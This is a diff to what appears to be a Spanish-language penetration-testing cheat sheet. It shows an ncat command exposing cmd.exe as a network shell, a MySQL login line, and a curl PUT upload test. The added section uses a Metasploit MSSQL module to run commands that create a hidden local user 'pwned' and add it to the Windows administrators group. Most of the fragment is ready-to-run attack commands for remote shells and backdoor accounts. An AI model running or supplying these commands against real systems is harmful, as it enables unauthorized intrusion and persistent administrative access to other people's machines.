@@ -64,6 +64,13 @@ ncat --exec cmd.exe --allow IP -vnl PUERTO --ssl
 
   **Conectarse por mysql**
   	mysql -uUSUARIO -pPASSWORD -h HOST
+	
+
+#MSSQL
+use auxiliary/admin/mssql/mssql_exec
+set CMD net user pwned pass000 /ADD
+net localgroup administrators pwned /ADD
+
 
 #WEB
 curl -T [archivo a subir] [IP target] (Prueba si está habilitado PUT para subir un archivo a la IP mandada)
